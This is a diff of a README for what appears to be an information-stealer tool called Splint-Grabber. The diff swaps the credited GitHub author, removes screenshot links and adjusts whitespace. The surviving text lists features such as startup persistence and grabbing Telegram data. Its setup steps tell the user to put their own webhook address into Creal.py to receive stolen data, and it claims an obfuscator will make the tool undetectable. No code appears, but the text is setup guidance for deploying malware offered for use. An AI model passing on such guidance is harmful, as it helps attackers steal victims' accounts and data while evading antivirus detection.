@@ -5,9 +5,9 @@
 
 
 # created by;
-https://github.com/yeshud
+https://github.com/0bmw
 
-                                                🤖 Futures
+                                            🤖 Futures
 
 Startup
 
@@ -23,14 +23,9 @@ Startup
 
 • Grab Telegram
 
-                                                🖼️ Pictures
-
-![Picsart_23-07-15_00-16-04-556](https://github.com/us0y/Splint-Grabber/assets/130321653/caa3fa2d-54bb-43e6-8d90-85d1573e3fed)
-
-![Picsart_23-07-15_00-20-15-547](https://github.com/us0y/Splint-Grabber/assets/130321653/b7ea0852-4f4a-476f-90eb-ad9c50ec4a1d)
-                                                
-                                                ⬇️ Setup (Manual)
-                                                  
+                                                      
+                                            ⬇️ Setup (Manual)
+                               
 • First paste and save your webhook address instead of `"SET YOUR WEBHOOK"` in Creal.py
 
 • If you use obfuscator it will be undetectable.
